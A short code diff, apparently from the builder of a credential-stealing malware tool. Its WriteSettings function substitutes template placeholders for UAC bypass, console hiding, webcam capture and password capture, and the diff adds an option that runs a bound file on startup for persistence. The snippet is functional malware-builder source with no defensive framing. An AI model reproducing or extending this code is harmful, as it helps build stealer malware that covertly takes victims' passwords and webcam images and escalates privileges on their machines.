@@ -31,6 +31,7 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('%uacBypass%', "true" if settings["settings"]["uacBypass"] else "")
     code = code.replace('%hideconsole%', "true" if settings["settings"]["consoleMode"] in (0, 1) else "")
     code = code.replace('%debug%', "true" if settings["settings"]["debug"] else "")
+    code = code.replace('%boundfilerunonstartup%', "true" if settings["settings"]["boundFileRunOnStartup"] else "")
     
     code = code.replace('%capturewebcam%', "true" if settings["modules"]["captureWebcam"] else "")
     code = code.replace('%capturepasswords%', "true" if settings["modules"]["capturePasswords"] else "")
